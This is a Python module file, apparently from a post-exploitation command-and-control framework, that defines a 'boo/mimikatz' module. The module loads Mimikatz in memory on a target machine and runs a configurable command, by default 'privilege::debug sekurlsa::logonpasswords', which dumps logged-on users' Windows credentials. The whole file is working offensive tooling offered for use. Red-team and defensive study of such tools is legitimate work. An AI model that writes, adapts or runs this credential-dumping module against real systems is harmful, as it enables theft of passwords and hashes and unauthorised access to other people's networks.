from core.teamserver.module import Module

class STModule(Module):
    def __init__(self):
        self.name = 'boo/mimikatz'
        self.language = 'boo'
        self.description = 'Loads Mimikatz in memory and executes the specified command'
        self.author = '@byt3bl33d3r'
        self.references = []
        self.options = {
            'Command': {
                'Description'   :   'Mimikatz command to run',
                'Required'      :   False,
                'Value'         :   'privilege::debug sekurlsa::logonpasswords'
            }
        }

    def payload(self):
        with open('core/teamserver/modules/boo/src/mimikatz.boo', 'r') as module_src:
            src = module_src.read()
            src = src.replace("MIMIKATZ_COMMAND", self.options['Command']['Value'])
            return src
